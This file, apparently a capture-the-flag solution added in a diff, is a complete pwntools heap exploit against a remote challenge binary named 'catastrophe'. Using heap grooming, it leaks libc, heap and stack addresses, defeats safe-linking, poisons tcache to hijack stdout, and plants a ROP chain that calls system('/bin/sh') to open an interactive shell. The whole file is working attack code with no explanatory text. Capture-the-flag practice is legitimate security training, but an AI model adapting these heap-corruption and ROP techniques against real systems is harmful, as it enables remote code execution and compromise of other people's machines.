@@ -1,0 +1,105 @@
+from pwn import *
+import codecs
+
+
+libc = ELF('./libc.so.6')
+
+# p = process('./catastrophe', env={"LD_PRELOAD": libc.path})
+p = remote("mc.ax", 31273)
+
+def add(idx, size, data):
+    p.sendlineafter(b"> ", str(1).encode("latin-1"))
+    p.sendlineafter(b"> ", str(idx).encode("latin-1"))
+    p.sendlineafter(b"> ", str(size).encode("latin-1"))
+    p.sendlineafter(b"Enter content: ", data)
+
+
+def delete(idx):
+    p.sendlineafter(b"> ", str(2).encode("latin-1"))
+    p.sendlineafter(b"> ", str(idx).encode("latin-1"))
+
+
+def view(idx):
+    p.sendlineafter(b"> ", str(3).encode("latin-1"))
+    p.sendlineafter(b"> ", str(idx).encode("latin-1"))
+
+
+def inverse_gray(n):
+    x = n
+    e = 12
+    while x:
+        x = n >> e
+        e *= 2
+        n = n ^ x
+    return n
+
+
+add(0, 0x100, b"A" * 8)
+add(1, 0x100, b"B" * 8)
+add(2, 0x100, b"C" * 8)
+add(3, 0x100, b"D" * 8)
+add(4, 0x100, b"E" * 8)
+add(5, 0x100, b"F" * 8)
+add(6, 0x100, b"G" * 8)
+add(7, 0x100, b"A" * 8)  # chunk A for consolidation
+add(8, 0x100, b"A" * 8)  # chunk B victim chunk
+add(9, 0x68, b"A" * 8)  # guard chunk prevent top chunk consolidation
+delete(6)
+delete(5)
+delete(4)
+delete(3)
+delete(2)
+delete(1)
+delete(0)
+delete(8)  # chunk B
+view(8)
+libc.address = int(codecs.encode(p.recvuntil('\x7f')[::-1], 'hex'), 16) - 0x219CE0 
+# lb()
+view(1)
+heap_leak = int(codecs.encode(p.recvuntil('U')[::-1], 'hex'), 16)
+# hb()
+delete(7)  # chunk A
+add(0, 0x100, b"A" * 8)  # chunk B victim chunk
+delete(8)  # chunk B is now coalasced with chunk A
+view(6)
+heap_base = inverse_gray(heap_leak) - 0x4c0
+print(f"Heap base := {hex(heap_base)}")
+print(f"Libc base := {hex(libc.address)}")
+add(
+    9,
+    0x120,
+    b"/bin/sh\x00".ljust(0x108, b"\x00")
+    + p64(0x111)
+    + p64(heap_base + 0x20 ^ (heap_base >> 12)),
+)
+
+stdout = libc.address + 0x21A780
+payload = (
+    p64(0xFBAD1800)
+    + p64(0) * 3
+    + p64(libc.sym["environ"])
+    + p64(libc.sym["environ"] + 0x8) * 3
+    + p64(libc.sym["environ"] + 0x9)
+)  # leak stack address
+add(9, 0x100, b"/bin/sh\x00")
+payload2 = p64(0x0101010101010101)*3 + p64(0)*11 + p64(0) * 14 + p64(heap_base+0x80) + p64(stdout)
+print(len(payload2))
+add(0, 0x100, payload2)
+add(0, 0x100, payload)
+
+stack_leak = int(codecs.encode(p.recvuntil('\x7f')[-6:][::-1], 'hex'), 16)
+print(hex(stack_leak))
+rop_loc = stack_leak - 0x138
+
+add(0, 0xf0, p64(rop_loc)*25)
+
+ret = libc.address + 0x50d8c
+bin_sh = libc.address + 0x1d8698
+system = libc.address + 0x50d60
+pop_rdi = libc.address + 0x000000000002a3e5
+
+pause()
+add(0, 0xe0, p64(ret)*5 + p64(pop_rdi) + p64(bin_sh) + p64(system))
+
+
+p.interactive()
